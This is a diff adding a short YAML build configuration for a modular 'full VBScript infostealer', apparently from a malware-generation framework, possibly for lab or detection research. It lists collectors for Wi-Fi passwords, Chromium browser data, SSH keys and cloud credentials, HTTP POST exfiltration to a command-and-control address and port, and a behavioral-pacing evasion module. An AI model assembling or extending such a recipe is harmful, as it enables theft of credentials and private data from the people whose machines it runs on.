@@ -1,0 +1,27 @@
+name: vbs_infostealer_cs_light_v1
+description: Full VBScript infostealer with all collectors, HTTP POST exfil
+format: vbscript
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/sysinfo
+- collectors/processes
+- collectors/network
+- collectors/installed_software
+- collectors/env_vars
+- collectors/drives
+- collectors/recent_files
+- collectors/security_products
+- collectors/wifi_passwords
+- collectors/browser_chromium
+- collectors/ssh_keys
+- collectors/cloud_creds
+exfil: exfil/http_post
+arch: arch/sequential
+evasion:
+- evasion/behavioral_pacing
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
